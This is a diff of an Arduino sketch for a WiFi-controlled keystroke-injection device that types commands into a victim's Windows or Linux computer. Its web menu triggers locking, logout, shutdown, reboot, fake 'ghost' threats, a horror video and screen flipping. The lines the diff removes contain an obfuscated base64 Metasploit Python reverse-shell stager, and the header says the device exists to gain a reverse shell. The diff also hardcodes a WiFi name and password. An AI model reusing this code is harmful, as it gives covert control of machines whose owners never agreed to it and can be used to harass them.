@@ -4,16 +4,15 @@
 //We are making use of this library to execute a metasploit reverse shell python code in the victim's machine and gain a reverse shell. 
 //Here, we will be using an Arduino Board, Arduino MKR1000 to integrate wireless network connectivity and perform HID attacks over WiFi
 
-//https://www.youtube.com/c/greenterminal --Here you will find so many penetration testing videos; software as well as hardware level.
-//Support us by subscribing the channel.... Happy Hacking........
-
+//http://bit.ly/arduino-hid --Here you will find so many penetration testing videos; software as well as hardware level.
+//Support us by subscribing the channel.... Happy Pranking........
 
 #include <SPI.h>
 #include <WiFi101.h>
-#include "Keyboard.h"
+#include <Keyboard.h>
 
-char ssid[] = "your_essid"; 
-char pass[] = "your_password";
+char ssid[] = "QB_OA"; 
+char pass[] = "spid3rs3nse";
 int keyIndex = 0;      
 int ledpin = 6;
 bool val = true;
@@ -64,12 +63,12 @@ void loop() {
             client.println("HTTP/1.1 200 OK");
             client.println("Content-type:text/html");
             client.println();
-            client.print("www.greenterminal.in<br>");
-            client.print("https://www.youtube.com/c/greenterminal<br>");
+            client.print("www.rootsaid.com<br>");
+            client.print("https://www.youtube.com/c/rootsaid<br>");
             client.print("<br>");
             client.print("<h1>Windows<br>");
             client.print("<br>");
-            client.print("<h1>Click <a href=\"/WT\">here</a> To Test<br>");
+            client.print("<h1>Click <a href=\"/WT\">here</a> Ghost Message <br>");
             client.print("Click <a href=\"/L\">here</a> To Lock Computer<br>");
             client.print("Click <a href=\"/WL\">here</a> To Logout<br>");
             client.print("Click <a href=\"/WS\">here</a> To Shutdown<br>");
@@ -79,12 +78,16 @@ void loop() {
             client.print("<br>");
             client.print("Linux<br>");
             client.print("<br>");
-            client.print("Click <a href=\"/KT\">here</a> To Test<br>");
+            client.print("Click <a href=\"/KT1\">here</a> Ghost Message <br>");
+            client.print("Click <a href=\"/KT2\">here</a> Ghost Message - Doomed <br>");
             client.print("Click <a href=\"/L\">here</a> To Lock<br>");
             client.print("Click <a href=\"/KL\">here</a> To Logout<br>");
             client.print("Click <a href=\"/KPD\">here</a> To Shutdown<br>");
             client.print("Click <a href=\"/KR\">here</a> To Reboot<br>");
-            client.print("Click <a href=\"/RS\">here</a> To Launch Reverse Shell<br></h1>");
+            client.print("Click <a href=\"/HV\">here</a> Play Scary Video<br>");
+            client.print("Click <a href=\"/ES1\">here</a> Execute Series 1<br>");
+            client.print("Click <a href=\"/ES2\">here</a> Execute Series 2<br>");
+            client.print("Click <a href=\"/RS\">here</a> Rotate Monitor<br></h1>");
             client.println();
             break;
           }
@@ -112,9 +115,14 @@ void loop() {
           shutdownDevice();         
         }
 //Linux
-        else if (currentLine.endsWith("GET /KT")) 
+        else if (currentLine.endsWith("GET /KT1")) 
         {
-          linuxTest();       
+          linuxMessage1();       
+        }
+
+        else if (currentLine.endsWith("GET /KT2")) 
+        {
+          linuxMessage2();       
         }
         else if (currentLine.endsWith("GET /KPD")) 
         {
@@ -124,13 +132,26 @@ void loop() {
         {
           linuxLogout();   
         }
-       else if (currentLine.endsWith("GET /KR")) 
+        else if (currentLine.endsWith("GET /KR")) 
         {
           linuxReboot();   
         }
-               else if (currentLine.endsWith("GET /RS")) 
+        else if (currentLine.endsWith("GET /RS")) 
         {
-          linuxReverseShell();   
+          linuxRotate();   
+        }
+        else if (currentLine.endsWith("GET /HV")) 
+        {
+          horrorVideo();   
+        }
+
+         else if (currentLine.endsWith("GET /ES1")) 
+        {
+          executeSeries1();   
+        }
+         else if (currentLine.endsWith("GET /ES2")) 
+        {
+          executeSeries2();   
         }
       }
     }
@@ -139,6 +160,7 @@ void loop() {
     Serial.println("client disonnected");
   }
 }
+
 
 void printWifiStatus() 
 {
@@ -212,22 +234,55 @@ void shutdownDevice()
       delay(1000);
 }
 
-void linuxTest()
+void linuxMessage1()
 {
       Keyboard.press(KEY_LEFT_CTRL);
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press('t');
       Keyboard.releaseAll();
-      delay(3000);
-      Keyboard.println("Linux HID TEST");
+      delay(1000);
+      
+      Keyboard.println(" I am the GHOST OF DATA PAST!!!   ");
+      delay(2000);
+      Keyboard.println("Ghost of Files That You Deleted for No Reason!!!   ");
+      delay(2000);
+      Keyboard.println(" Why Did You Delete ME??    ");
+      delay(2000);
+      Keyboard.println(" I will HAUNT You This PC for What You Have Done!!!!!! ");
+      delay(4000);
+      Keyboard.write(KEY_RETURN);
+      Keyboard.println("exit");
+      Keyboard.write(KEY_RETURN);
+
 }
+
+void linuxMessage2()
+{
+      Keyboard.press(KEY_LEFT_CTRL);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press('t');
+      Keyboard.releaseAll();
+      delay(500);
+      Keyboard.println(" You Really Thought You can Save this PC..... ");
+      delay(2000);
+      Keyboard.println(" with a Reboot??  ");
+      delay(2000);
+      Keyboard.println("There is no Escape!!! ");
+      delay(2000);
+      Keyboard.println("Your PC is Doomed Forever ...... ");
+      delay(4000);
+      Keyboard.write(KEY_RETURN);
+      Keyboard.println("exit");
+      Keyboard.write(KEY_RETURN);
+}
+
 void linuxPoweroff()
 {
       Keyboard.press(KEY_LEFT_CTRL);
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press('t');
       Keyboard.releaseAll();
-      delay(3000);
+      delay(1000);
       Keyboard.println("poweroff");
       delay(50);
       Keyboard.write(KEY_RETURN);
@@ -238,7 +293,7 @@ void linuxReboot()
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press('t');
       Keyboard.releaseAll();
-      delay(3000);
+      delay(1000);
       Keyboard.println("reboot");
       delay(50);
       Keyboard.write(KEY_RETURN);
@@ -249,37 +304,83 @@ void linuxLogout()
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press('t');
       Keyboard.releaseAll();
-      delay(3000);
-      Keyboard.println("gnome-session-quit");
       delay(1000);
+      Keyboard.println("gnome-session-quit");
+      delay(100);
       Keyboard.write(KEY_RETURN);
       delay(50);
       Keyboard.write(KEY_RETURN);
 }
-void linuxReverseShell()
+void linuxRotate()
 {
       Keyboard.press(KEY_LEFT_CTRL);
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press('t');
       Keyboard.releaseAll();
-      delay(3000);
-      Keyboard.println("python");
-      delay(100);
-      Keyboard.write(KEY_RETURN);
       delay(1000);
-      Keyboard.println("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))");
-      delay(500);
+      Keyboard.println("gnome-terminal --geometry=0x0+0+0 & exit");
+      delay(50);
       Keyboard.write(KEY_RETURN);
       delay(500);
-      Keyboard.println("exit()");
-      delay(500);
+      Keyboard.println("xrandr -o inverted");
       Keyboard.write(KEY_RETURN);
       delay(50);
-      Keyboard.println("exit");
-      Keyboard.write(KEY_RETURN);
-      delay(50);
-
 }
 
+void horrorVideo()
+{
+      Keyboard.press(KEY_LEFT_CTRL);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press('t');
+      Keyboard.releaseAll();
+      delay(1000);
+      Keyboard.println("gnome-terminal --geometry=0x0+0+0 & exit");
+      delay(50);
+      Keyboard.write(KEY_RETURN);
+      delay(500);
+      Keyboard.println("google-chrome https://youtu.be/rwgEHs2JK2w?t=25");
+      delay(50);
+      Keyboard.write(KEY_RETURN);
+      delay(50);
+}
 
+void launchTerminal()
+{
+      Keyboard.press(KEY_LEFT_CTRL);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press('t');
+      Keyboard.releaseAll();
+      delay(1000);
+}
 
+void executeSeries1()
+{
+  launchTerminal();
+  delay(5000);  
+  linuxMessage1();
+  delay(5000);
+  lockDevice(); 
+  delay(5000);
+  
+}
+
+void executeSeries2()
+{
+
+  linuxMessage2();
+  horrorVideo();
+  delay(8000);
+  linuxRotate();
+  delay(2000);
+  Keyboard.println("xrandr -o normal");
+  Keyboard.write(KEY_RETURN);
+  delay(4000);
+  Keyboard.println("xrandr -o inverted");
+  Keyboard.write(KEY_RETURN);
+  delay(2000);
+  Keyboard.println("xrandr -o normal");
+  Keyboard.write(KEY_RETURN);
+  delay(4000);
+  Keyboard.println("xrandr -o inverted");
+  Keyboard.write(KEY_RETURN);
+}
